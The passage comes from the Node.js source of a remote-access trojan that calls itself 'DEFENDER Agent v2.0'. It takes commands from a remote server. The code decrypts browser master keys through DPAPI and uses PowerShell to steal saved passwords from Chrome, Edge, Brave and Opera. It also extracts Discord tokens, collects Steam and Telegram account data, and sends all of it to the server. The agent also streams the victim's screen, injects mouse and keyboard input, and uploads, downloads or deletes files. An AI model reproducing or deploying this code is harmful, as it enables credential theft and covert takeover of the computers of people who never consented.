                  passwords.push(`❌ Could not open: ${e.message}`);
                }
              }
            }
            
            if (!found) {
              passwords.push(`⚠️ No supported browsers are currently running`);
              passwords.push(``);
              passwords.push(`📝 To extract v20 passwords:`);
              passwords.push(`1. Open Edge or Chrome`);
              passwords.push(`2. Run this command again`);
              passwords.push(`3. Follow the export instructions`);
              passwords.push(``);
              passwords.push(`💡 Alternative: Manual export`);
              passwords.push(`• Edge: edge://settings/passwords → Export`);
              passwords.push(`• Chrome: chrome://settings/passwords → Export`);
            }
            
            socket.emit('command-result', { 
              command: 'grab-v20-passwords', 
              result: passwords.join('\n')
            });
          } catch (e) {
            socket.emit('command-result', { 
              command: 'grab-v20-passwords', 
              result: `❌ Error: ${e.message}`, 
              error: true 
            });
          }
          return;
        }
        case 'grab-accounts': {
          try {
            const crypto = require('crypto');
            const { execSync } = require('child_process');
            const http = require('http');
            const discTokens = [];
            const brData = [];
            const appData = [];

            // Helper: AES-GCM decrypt for v10/v11 encrypted data
            function aesGcmDecrypt(key, encryptedData) {
              try {
                if (!Buffer.isBuffer(encryptedData)) encryptedData = Buffer.from(encryptedData);
                if (!key || encryptedData.length < 31) return null;
                
                // Check for v10/v11 prefix
                const prefix = encryptedData.slice(0, 3).toString();
                if (prefix !== 'v10' && prefix !== 'v11') return null;
                
                // v10/v11 format: prefix(3) + nonce(12) + ciphertext + tag(16)
                const nonce = encryptedData.slice(3, 15);
                const tag = encryptedData.slice(-16);
                const ciphertext = encryptedData.slice(15, -16);
                
                const decipher = crypto.createDecipheriv('aes-256-gcm', key, nonce);
                decipher.setAuthTag(tag);
                const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
                
                return decrypted.toString('utf8');
              } catch {
                return null;
              }
            }

            // Helper: Get master key from Local State
            function getMasterKey(localStatePath) {
              try {
                if (!fs.existsSync(localStatePath)) return null;
                
                const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
                const encKeyB64 = localState?.os_crypt?.encrypted_key;
                if (!encKeyB64) return null;
                
                const encKey = Buffer.from(encKeyB64, 'base64').slice(5); // Remove "DPAPI" prefix
                
                // Use PowerShell to decrypt via DPAPI
                const psCode = [
                  'Add-Type -AssemblyName System.Security',
                  `$e=[Convert]::FromBase64String('${encKey.toString('base64')}')`,
                  '$d=[System.Security.Cryptography.ProtectedData]::Unprotect($e,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)',
                  '[Convert]::ToBase64String($d)'
                ].join(';');
                
                const out = execSync(`powershell -NoProfile -Command "${psCode}"`, {
                  timeout: 10000,
                  windowsHide: true
                }).toString().trim();
                
                return out ? Buffer.from(out, 'base64') : null;
              } catch {
                return null;
              }
            }

            // Helper: CDP - Send command via Chrome DevTools Protocol
            function cdpRequest(port, method, params = {}) {
              return new Promise((resolve) => {
                try {
                  const data = JSON.stringify({ id: Date.now(), method, params });
                  const options = {
                    hostname: '127.0.0.1',
                    port,
                    path: '/json',
                    method: 'GET',
                    timeout: 3000
                  };
                  
                  const req = http.request(options, (res) => {
                    let body = '';
                    res.on('data', chunk => body += chunk);
                    res.on('end', () => {
                      try {
                        const tabs = JSON.parse(body);
                        if (tabs.length > 0) {
                          const wsUrl = tabs[0].webSocketDebuggerUrl;
                          resolve({ wsUrl });
                        } else {
                          resolve(null);
                        }
                      } catch {
                        resolve(null);
                      }
                    });
                  });
                  
                  req.on('error', () => resolve(null));
                  req.on('timeout', () => { req.destroy(); resolve(null); });
                  req.end();
                } catch {
                  resolve(null);
                }
              });
            }

            // Helper: Try to extract passwords via CDP (for v20)
            async function extractV20Passwords(browserName, browserPath, userDataPath) {
              const passwords = [];
              const debugPort = 9222 + Math.floor(Math.random() * 1000);
              let browserProc = null;
              
              try {
                // Launch browser with remote debugging
                const launchCmd = `"${browserPath}" --remote-debugging-port=${debugPort} --user-data-dir="${userDataPath}" --headless --disable-gpu`;
                browserProc = exec(launchCmd, { windowsHide: true });
                
                // Wait for CDP to be ready
                await new Promise(r => setTimeout(r, 3000));
                
                // Check if CDP is available
                const cdpInfo = await cdpRequest(debugPort);
                if (!cdpInfo) {
                  if (browserProc) browserProc.kill();
                  return passwords;
                }
                
                // CDP extraction would require WebSocket implementation
                // For now, return empty to avoid complexity
                if (browserProc) browserProc.kill();
                return passwords;
              } catch {
                if (browserProc) try { browserProc.kill(); } catch {}
                return passwords;
              }
            }


            // ===== DISCORD TOKENS =====
            const discordPaths = [
              { name: 'Discord', dir: path.join(process.env.APPDATA, 'discord') },
              { name: 'Discord Canary', dir: path.join(process.env.APPDATA, 'discordcanary') },
              { name: 'Discord PTB', dir: path.join(process.env.APPDATA, 'discordptb') },
              { name: 'Discord Development', dir: path.join(process.env.APPDATA, 'discorddevelopment') },
            ];

            for (const disc of discordPaths) {
              const ldbPath = path.join(disc.dir, 'Local Storage', 'leveldb');
              const localStatePath = path.join(disc.dir, 'Local State');
              
              if (!fs.existsSync(ldbPath)) continue;
              
              const masterKey = getMasterKey(localStatePath);
              const files = fs.readdirSync(ldbPath).filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
              
              for (const file of files) {
                try {
                  const content = fs.readFileSync(path.join(ldbPath, file));
                  
                  // Search for unencrypted tokens (plain text)
                  const textContent = content.toString('utf8', 0, Math.min(content.length, 2000000));
                  const plainTokens = textContent.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/g) || [];
                  
                  for (const token of plainTokens) {
                    try {
                      // Validate it's a real Discord token by checking the first part
                      const userId = Buffer.from(token.split('.')[0], 'base64').toString();
                      if (/^\d{17,19}$/.test(userId) && !discTokens.find(t => t.token === token)) {
                        discTokens.push({ token, source: disc.name, updated: new Date().toLocaleString('es-ES') });
                      }
                    } catch {}
                  }
                  
                  // Search for encrypted tokens (dQw4w9WgXcQ: prefix)
                  if (masterKey) {
                    const marker = Buffer.from('dQw4w9WgXcQ:');
                    let pos = 0;
                    
                    while (true) {
                      pos = content.indexOf(marker, pos);
                      if (pos === -1) break;
                      
                      pos += marker.length;
                      
                      // Extract base64 after marker
                      let base64Str = '';
                      for (let i = pos; i < content.length && i < pos + 500; i++) {
                        const char = String.fromCharCode(content[i]);
                        if (/[A-Za-z0-9+\/=]/.test(char)) {
                          base64Str += char;
                        } else {
                          break;
                        }
                      }
                      
                      if (base64Str.length > 30) {
                        try {
                          const encData = Buffer.from(base64Str, 'base64');
                          const decrypted = aesGcmDecrypt(masterKey, encData);
                          
                          if (decrypted && decrypted.length > 30 && decrypted.includes('.')) {
                            // Validate format
                            if (/[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/.test(decrypted)) {
                              if (!discTokens.find(t => t.token === decrypted)) {
                                discTokens.push({ 
                                  token: decrypted, 
                                  source: `${disc.name} (Encrypted)`, 
                                  updated: new Date().toLocaleString('es-ES') 
                                });
                              }
                            }
                          }
                        } catch {}
                      }
                    }
                  }
                } catch {}
              }
            }

            // ===== BROWSER DATA =====
            const browsers = [
              { name: 'Chrome', base: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data') },
              { name: 'Edge', base: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data') },
              { name: 'Brave', base: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data') },
              { name: 'Opera', base: path.join(process.env.APPDATA, 'Opera Software', 'Opera Stable') },
            ];

            for (const br of browsers) {
              if (!fs.existsSync(br.base)) continue;
              
              const masterKey = getMasterKey(path.join(br.base, 'Local State'));
              if (!masterKey) continue;

              // Scan for Discord tokens in browser localStorage
              const ldbPath = path.join(br.base, 'Default', 'Local Storage', 'leveldb');
              if (fs.existsSync(ldbPath)) {
                const files = fs.readdirSync(ldbPath).filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
                
                for (const file of files) {
                  try {
                    const content = fs.readFileSync(path.join(ldbPath, file));
                    const textContent = content.toString('utf8', 0, Math.min(content.length, 2000000));
                    
                    // Plain tokens
                    const plainTokens = textContent.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/g) || [];
                    for (const token of plainTokens) {
                      try {
                        const userId = Buffer.from(token.split('.')[0], 'base64').toString();
                        if (/^\d{17,19}$/.test(userId) && !discTokens.find(t => t.token === token)) {
                          discTokens.push({ 
                            token, 
                            source: `${br.name} Browser`, 
                            updated: new Date().toLocaleString('es-ES') 
                          });
                        }
                      } catch {}
                    }
                    
                    // Encrypted tokens with dQw4w9WgXcQ: prefix
                    const marker = Buffer.from('dQw4w9WgXcQ:');
                    let pos = 0;
                    
                    while (true) {
                      pos = content.indexOf(marker, pos);
                      if (pos === -1) break;
                      pos += marker.length;
                      
                      let base64Str = '';
                      for (let i = pos; i < content.length && i < pos + 500; i++) {
                        const char = String.fromCharCode(content[i]);
                        if (/[A-Za-z0-9+\/=]/.test(char)) base64Str += char;
                        else break;
                      }
                      
                      if (base64Str.length > 30) {
                        try {
                          const encData = Buffer.from(base64Str, 'base64');
                          const decrypted = aesGcmDecrypt(masterKey, encData);
                          
                          if (decrypted && /[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/.test(decrypted)) {
                            if (!discTokens.find(t => t.token === decrypted)) {
                              discTokens.push({ 
                                token: decrypted, 
                                source: `${br.name} Browser (Encrypted)`, 
                                updated: new Date().toLocaleString('es-ES') 
                              });
                            }
                          }
                        } catch {}
                      }
                    }
                  } catch {}
                }
              }

              // Passwords from Login Data
              for (const profile of ['Default', 'Profile 1', 'Profile 2', 'Profile 3']) {
                const loginDb = path.join(br.base, profile, 'Login Data');
                if (!fs.existsSync(loginDb)) continue;
                
                const tmpDb = path.join(os.tmpdir(), `ld_${Date.now()}.db`);
                
                try {
                  // Copy database
                  try {
                    execSync(`copy /Y "${loginDb}" "${tmpDb}"`, { 
                      shell: 'cmd.exe', 
                      timeout: 5000, 
                      windowsHide: true 
                    });
                  } catch {
                    fs.copyFileSync(loginDb, tmpDb);
                  }
                  
                  // Read database with PowerShell + winsqlite3.dll
                  const psScript = [
                    'Add-Type -TypeDefinition @"',
                    'using System;',
                    'using System.Runtime.InteropServices;',
                    'public class DB {',
                    '  [DllImport("winsqlite3.dll")] public static extern int sqlite3_open(string f, out IntPtr db);',
                    '  [DllImport("winsqlite3.dll")] public static extern int sqlite3_prepare_v2(IntPtr db, string sql, int n, out IntPtr st, IntPtr t);',
                    '  [DllImport("winsqlite3.dll")] public static extern int sqlite3_step(IntPtr st);',
                    '  [DllImport("winsqlite3.dll")] public static extern IntPtr sqlite3_column_text(IntPtr st, int c);',
                    '  [DllImport("winsqlite3.dll")] public static extern IntPtr sqlite3_column_blob(IntPtr st, int c);',
                    '  [DllImport("winsqlite3.dll")] public static extern int sqlite3_column_bytes(IntPtr st, int c);',
                    '  [DllImport("winsqlite3.dll")] public static extern int sqlite3_finalize(IntPtr st);',
                    '  [DllImport("winsqlite3.dll")] public static extern int sqlite3_close(IntPtr db);',
                    '}',
                    '"@',
                    '$db=[IntPtr]::Zero;$st=[IntPtr]::Zero',
                    `[void][DB]::sqlite3_open("${tmpDb.replace(/\\/g, '/')}",[ref]$db)`,
                    '[void][DB]::sqlite3_prepare_v2($db,"SELECT origin_url,username_value,password_value FROM logins WHERE username_value<>\'\' LIMIT 100",-1,[ref]$st,[IntPtr]::Zero)',
                    '$r=@()',
                    'while([DB]::sqlite3_step($st) -eq 100){',
                    '  $url=[Runtime.InteropServices.Marshal]::PtrToStringAnsi([DB]::sqlite3_column_text($st,0))',
                    '  $user=[Runtime.InteropServices.Marshal]::PtrToStringAnsi([DB]::sqlite3_column_text($st,1))',
                    '  $bPtr=[DB]::sqlite3_column_blob($st,2);$bLen=[DB]::sqlite3_column_bytes($st,2)',
                    '  $blob=[byte[]]::new($bLen);if($bLen -gt 0){[Runtime.InteropServices.Marshal]::Copy($bPtr,$blob,0,$bLen)}',
                    '  $r+=@{u=$url;n=$user;p=[Convert]::ToBase64String($blob)}',
                    '}',
                    '[void][DB]::sqlite3_finalize($st);[void][DB]::sqlite3_close($db)',
                    '$r|ConvertTo-Json -Compress'
                  ].join('\r\n');
                  
                  const tmpPs = path.join(os.tmpdir(), `sq_${Date.now()}.ps1`);
                  fs.writeFileSync(tmpPs, psScript);
                  
                  let psOut = '';
                  try {
                    psOut = execSync(`powershell -ExecutionPolicy Bypass -File "${tmpPs}"`, {
                      timeout: 15000,
                      windowsHide: true
                    }).toString().trim();
                  } catch {}
                  
                  try { fs.unlinkSync(tmpPs); } catch {}
                  
                  if (psOut) {
                    let rows = [];
                    try {
                      rows = JSON.parse(psOut);
                      if (!Array.isArray(rows)) rows = [rows];
                    } catch {}
                    
                    for (const row of rows) {
                      if (!row || !row.n) continue;
                      
                      const encPass = Buffer.from(row.p, 'base64');
                      let password = '';
                      
                      // Check version
                      const version = encPass.slice(0, 3).toString();
                      
                      if (version === 'v10' || version === 'v11') {
                        // v10/v11: Can decrypt with master key
                        const decrypted = aesGcmDecrypt(masterKey, encPass);
                        if (decrypted) password = decrypted;
                        else password = `[v10/v11 failed]`;
                      } else if (version === 'v20') {
                        // v20: App-Bound Encryption - Cannot decrypt without browser process
                        password = `[v20-ABE protected]`;
                      } else {
                        password = `[unknown: ${version}]`;
                      }
                      
                      brData.push({
                        browser: br.name,
                        profile,
                        url: row.u,
                        username: row.n,
                        password: password,
                        type: 'credential'
                      });
                    }
                  }
                } catch {} finally {
                  try { fs.unlinkSync(tmpDb); } catch {}
                }
                
                // Cookies count
                const cookieDb = path.join(br.base, profile, 'Network', 'Cookies');
                if (fs.existsSync(cookieDb)) {
                  try {
                    const size = fs.statSync(cookieDb).size;
                    brData.push({
                      browser: br.name,
                      profile,
                      cookies: String(Math.floor(size / 100)),
                      type: 'cookies'
                    });
                  } catch {}
                }
              }
            }

            // ===== APPS =====
            const tgPath = path.join(process.env.APPDATA || '', 'Telegram Desktop', 'tdata');
            if (fs.existsSync(tgPath)) appData.push({ app: 'Telegram', icon: '\uD83D\uDCF1', data: 'tdata en ' + tgPath, updated: new Date().toLocaleString('es-ES') });
            try { const sc = 'C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf'; if (fs.existsSync(sc)) appData.push({ app: 'Steam', icon: '\uD83C\uDFAE', data: 'loginusers.vdf', token: fs.readFileSync(sc,'utf8').substring(0,300), updated: new Date().toLocaleString('es-ES') }); } catch {}

            socket.emit('accounts-data', { discord: discTokens, browsers: brData, apps: appData });
          } catch(e) {
            socket.emit('command-result', { command, result: 'Error: ' + e.message, error: true });
          }
          return;
        }                default: result = `❌ Comando desconocido: ${command}`;
      }
      socket.emit('command-result', { command, result });
    } catch (err) {
      socket.emit('command-result', { command, result: `❌ ${err.message}`, error: true });
    }
  });

  // Screenshot
  socket.on('take-screenshot', async () => {
    console.log('[CMD] 📸 Solicitud de screenshot');
    const img = await takeScreenshot(70);
    if (img) {
      console.log('[CMD] ✅ Screenshot enviado');
      socket.emit('screenshot-result', { image: img });
    } else {
      console.log('[CMD] ❌ Screenshot falló');
      socket.emit('command-result', { command: 'screenshot', result: '❌ Error al capturar', error: true });
    }
  });

  // Screen stream
  socket.on('start-screen-stream', (opts) => {
    console.log(`[CMD] 🎬 Iniciando stream - FPS: ${opts.fps || 2}, Calidad: ${opts.quality || 40}%`);
    startScreenStream(opts.fps || 2, opts.quality || 40);
  });
  
  socket.on('stop-screen-stream', () => {
    console.log('[CMD] 🛑 Deteniendo stream');
    stopScreenStream();
  });

  // Files
  socket.on('list-directory', (d) => listDirectory(d.path));
  socket.on('download-file', (d) => {
    try {
      const fp = path.resolve(currentDir, d.filepath);
      if (!fs.existsSync(fp)) { socket.emit('command-result', { command: 'download', result: '❌ No encontrado', error: true }); return; }
      const stat = fs.statSync(fp);
      if (stat.size > 600 * 1024 * 1024) { socket.emit('command-result', { command: 'download', result: '❌ >25MB', error: true }); return; }
      socket.emit('file-data', { filename: path.basename(fp), data: fs.readFileSync(fp).toString('base64'), mimetype: 'application/octet-stream' });
    } catch (e) { socket.emit('command-result', { command: 'download', result: `❌ ${e.message}`, error: true }); }
  });
  socket.on('upload-file', (d) => {
    try {
      const dest = path.join(d.destPath ? path.resolve(currentDir, d.destPath) : currentDir, d.filename);
      fs.writeFileSync(dest, Buffer.from(d.data, 'base64'));
      socket.emit('command-result', { command: 'upload', result: `✅ Guardado: ${dest}` });
      // Refresh directory listing
      listDirectory(currentDir);
    } catch (e) { socket.emit('command-result', { command: 'upload', result: `❌ ${e.message}`, error: true }); }
  });
  socket.on('delete-file', (d) => {
    try {
      const fp = path.resolve(currentDir, d.filepath);
      if (!fs.existsSync(fp)) {
        socket.emit('command-result', { command: 'delete', result: '❌ Archivo no encontrado', error: true });
        return;
      }
      fs.unlinkSync(fp);
      socket.emit('command-result', { command: 'delete', result: `✅ Eliminado: ${path.basename(fp)}` });
      // Refresh directory listing
      listDirectory(currentDir);
    } catch (e) { socket.emit('command-result', { command: 'delete', result: `❌ ${e.message}`, error: true }); }
  });

  // Create folder
  socket.on('create-folder', (d) => {
    try {
      const folderPath = path.join(d.path || currentDir, d.folderName);
      fs.mkdirSync(folderPath, { recursive: true });
      socket.emit('command-result', { command: 'create-folder', result: `✅ Carpeta creada: ${d.folderName}` });
      listDirectory(d.path || currentDir);
    } catch (e) { socket.emit('command-result', { command: 'create-folder', result: `❌ ${e.message}`, error: true }); }
  });

  // Rename file/folder
  socket.on('rename-file', (d) => {
    try {
      const oldPath = d.oldPath;
      const newPath = path.join(path.dirname(oldPath), d.newName);
      fs.renameSync(oldPath, newPath);
      socket.emit('command-result', { command: 'rename', result: `✅ Renombrado a: ${d.newName}` });
      listDirectory(path.dirname(oldPath));
    } catch (e) { socket.emit('command-result', { command: 'rename', result: `❌ ${e.message}`, error: true }); }
  });

  // Copy files
  socket.on('copy-files', (d) => {
    try {
      let copiedCount = 0;
      d.files.forEach(srcFile => {
        const dest = path.join(d.destPath, path.basename(srcFile));
        fs.copyFileSync(srcFile, dest);
        copiedCount++;
      });
      socket.emit('command-result', { command: 'copy', result: `✅ ${copiedCount} archivo(s) copiado(s)` });
      listDirectory(d.destPath);
    } catch (e) { socket.emit('command-result', { command: 'copy', result: `❌ ${e.message}`, error: true }); }
  });

  // Move files
  socket.on('move-files', (d) => {
    try {
      let movedCount = 0;
      d.files.forEach(srcFile => {
        const dest = path.join(d.destPath, path.basename(srcFile));
        fs.renameSync(srcFile, dest);
        movedCount++;
      });
      socket.emit('command-result', { command: 'move', result: `✅ ${movedCount} archivo(s) movido(s)` });
      listDirectory(d.destPath);
    } catch (e) { socket.emit('command-result', { command: 'move', result: `❌ ${e.message}`, error: true }); }
  });

  // Preview file
  socket.on('preview-file', (d) => {
    try {
      const fp = d.filepath;
      if (!fs.existsSync(fp)) {
        socket.emit('command-result', { command: 'preview', result: '❌ Archivo no encontrado', error: true });
        return;
      }
      
      const content = fs.readFileSync(fp).toString('base64');
      socket.emit('preview-result', {
        type: d.type,
        content: content,
        filename: path.basename(fp)
      });
    } catch (e) { socket.emit('command-result', { command: 'preview', result: `❌ ${e.message}`, error: true }); }
  });

  // Read file content for editing
  socket.on('read-file-content', (d) => {
    try {
      const fp = d.filepath;
      if (!fs.existsSync(fp)) {
        socket.emit('command-result', { command: 'read', result: '❌ Archivo no encontrado', error: true });
        return;
      }
      
      const content = fs.readFileSync(fp, 'utf8');
      const base64Content = Buffer.from(content).toString('base64');
      socket.emit('file-content', {
        content: base64Content,
        filename: path.basename(fp)
      });
    } catch (e) { socket.emit('command-result', { command: 'read', result: `❌ ${e.message}`, error: true }); }
  });

  // Save file content
  socket.on('save-file-content', (d) => {
    try {
      const fp = d.filepath;
      const content = Buffer.from(d.content, 'base64').toString('utf8');
      fs.writeFileSync(fp, content, 'utf8');
      socket.emit('command-result', { command: 'save', result: `✅ Archivo guardado: ${path.basename(fp)}` });
    } catch (e) { socket.emit('command-result', { command: 'save', result: `❌ ${e.message}`, error: true }); }
  });

  // Compress files (ZIP)
  socket.on('compress-files', (d) => {
    try {
      const zipPath = path.join(d.destPath, d.zipName);
      const output = fs.createWriteStream(zipPath);
      const archive = archiver('zip', { zlib: { level: 9 } });
      
      output.on('close', () => {
        socket.emit('command-result', { command: 'compress', result: `✅ ZIP creado: ${d.zipName} (${(archive.pointer() / 1024).toFixed(2)} KB)` });
        listDirectory(d.destPath);
      });
      
      archive.on('error', (err) => {
        socket.emit('command-result', { command: 'compress', result: `❌ ${err.message}`, error: true });
      });
      
      archive.pipe(output);
      
      d.files.forEach(file => {
        if (fs.existsSync(file)) {
          const stat = fs.statSync(file);
          if (stat.isDirectory()) {
            archive.directory(file, path.basename(file));
          } else {
            archive.file(file, { name: path.basename(file) });
          }
        }
      });
      
      archive.finalize();
    } catch (e) { 
      socket.emit('command-result', { command: 'compress', result: `❌ ${e.message}`, error: true }); 
    }
  });

  socket.on('get-processes', async () => {
    socket.emit('processes-result', { result: await runShell('tasklist /FO TABLE') });
  });

  // Remote input control (mouse + keyboard)
  socket.on('remote-input', (data) => {
    try {
      const { execSync } = require('child_process');
      const tp = path.join(os.tmpdir(), 'ri_' + Date.now() + '.ps1');
      let psCode = '';

      switch(data.type) {
        case 'move_mouse':
          psCode = [
            'Add-Type -MemberDefinition \'[DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);\' -Name U -Namespace RI',
            '[RI.U]::SetCursorPos(' + (data.x || 0) + ', ' + (data.y || 0) + ')'
          ].join('\r\n');
          break;
        case 'click':
          psCode = [
            'Add-Type -MemberDefinition \'[DllImport("user32.dll")] public static extern void mouse_event(int f,int dx,int dy,int d,int e);\' -Name U -Namespace RI',
            '[RI.U]::mouse_event(0x0002, 0, 0, 0, 0)',
            '[RI.U]::mouse_event(0x0004, 0, 0, 0, 0)'
          ].join('\r\n');
          break;
        case 'rightclick':
          psCode = [
            'Add-Type -MemberDefinition \'[DllImport("user32.dll")] public static extern void mouse_event(int f,int dx,int dy,int d,int e);\' -Name U -Namespace RI',
            '[RI.U]::mouse_event(0x0008, 0, 0, 0, 0)',
            '[RI.U]::mouse_event(0x0010, 0, 0, 0, 0)'
          ].join('\r\n');
          break;
        case 'keypress':
          const keyMap = {
            'enter': '{ENTER}', 'backspace': '{BACKSPACE}', 'tab': '{TAB}',
            'escape': '{ESC}', 'delete': '{DELETE}', 'home': '{HOME}', 'end': '{END}',
            'pageup': '{PGUP}', 'pagedown': '{PGDN}',
            'up': '{UP}', 'down': '{DOWN}', 'left': '{LEFT}', 'right': '{RIGHT}',
            'f1': '{F1}', 'f2': '{F2}', 'f3': '{F3}', 'f4': '{F4}', 'f5': '{F5}',
            'f6': '{F6}', 'f7': '{F7}', 'f8': '{F8}', 'f9': '{F9}', 'f10': '{F10}',
            'f11': '{F11}', 'f12': '{F12}'
          };
          const sendKey = keyMap[data.key] || data.key;
          psCode = "$w = New-Object -ComObject WScript.Shell\r\n$w.SendKeys('" + sendKey.replace(/'/g, "''") + "')";
          break;
        case 'type':
          const txt = (data.text || '').replace(/'/g, "''").replace(/[+^%~(){}[\]]/g, '{$&}');
          psCode = "$w = New-Object -ComObject WScript.Shell\r\n$w.SendKeys('" + txt + "')";
          break;
        default: return;
      }

      if (psCode) {
        fs.writeFileSync(tp, psCode);
        execSync('powershell -ExecutionPolicy Bypass -File "' + tp + '"', { timeout: 3000, windowsHide: true });
        try { fs.unlinkSync(tp); } catch {}
      }
    } catch(e) { console.log('[INPUT] Error:', e.message); }
  });

  // Detailed processes for Task Manager
  // (handled in execute-command switch)
}

// =============================================
// MAIN
// =============================================
async function main() {
  console.log('');
  console.log('╔══════════════════════════════════════════════╗');
  console.log('║   🛡️  DEFENDER Agent v2.0                    ║');
  console.log(`║   📡 Server: ${SERVER_URL.padEnd(31)}║`);
  console.log(`║   🆔 ID: ${DEVICE_ID.padEnd(34)}║`);
  console.log('╚══════════════════════════════════════════════╝');
  console.log('');
  await connect();
}

main().catch(e => { console.error('Fatal:', e); process.exit(1); });
